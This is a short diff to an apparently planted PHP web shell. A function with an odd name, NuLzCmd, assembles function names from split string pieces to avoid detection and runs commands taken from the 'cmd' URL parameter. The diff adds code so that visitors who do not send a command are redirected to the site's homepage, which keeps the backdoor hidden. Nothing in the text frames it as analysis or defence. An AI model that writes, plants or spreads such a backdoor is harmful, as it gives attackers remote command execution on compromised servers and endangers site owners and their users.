@@ -1,4 +1,6 @@
 <?php
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
 function NuLzCmd($komendnya) {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $fw = 'f'.'wr'.'it'.'e';
@@ -78,5 +80,7 @@ if (isset($_GET['cmd'])) {
     echo '<center><textarea rows="50" cols="80">';
     echo NuLzCmd($komendnya);
     echo '</textarea></center>';
+} else {
+    echo 'window.location.href = "'.$domainUrl.'"; ';
 }
 ?>
